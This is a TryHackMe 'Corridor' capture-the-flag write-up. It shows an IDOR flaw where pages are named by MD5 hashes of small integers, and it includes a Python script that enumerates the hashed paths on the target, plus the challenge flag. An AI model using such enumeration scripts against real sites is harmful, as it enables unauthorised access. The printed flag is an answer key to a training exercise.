```
Platform: TryHackMe
Challenge: Corridor
Task: IDOR
OS: 
Tools Used: Python
Author: Paul B.
```
We are presented with a webpage of corridor, If we can click on the door we are taken to a different page. 


Take a close look of the URL, we can see hash sum which looks similar to md5. Let's crack the hash using [Crackstation](https://crackstation.net/). Hence we understood that the hash are nothing but numerical values starting from 1 to 13

Let's create a simple python script to guess the hidden door
```
#!/usr/bin/python3

import argparse
import hashlib
import requests

parser = argparse.ArgumentParser()
parser.add_argument('target_ip')

args = parser.parse_args()

for i in range(20):
	hashValue = hashlib.md5(f"{i}".encode('utf-8')).hexdigest()
	print(f"http://{args.target_ip}/{hashValue}")
	req = requests.get(f"http://{args.target_ip}/{hashValue}")
	status = req.status_code
	print(f'Value: {i}; Hash: {hashValue}; Status: {status}\n')

```
Run the script!
```
python3 md5.py [target IP]
```

Superb! The hidden page numeric value is `0` and the hash value is `cfcd208495d565ef66e7dff9f98764da`

### Answer the questions below
What is the flag?
```
flag{2477ef02448ad9156661ac40a6b8862e}
```
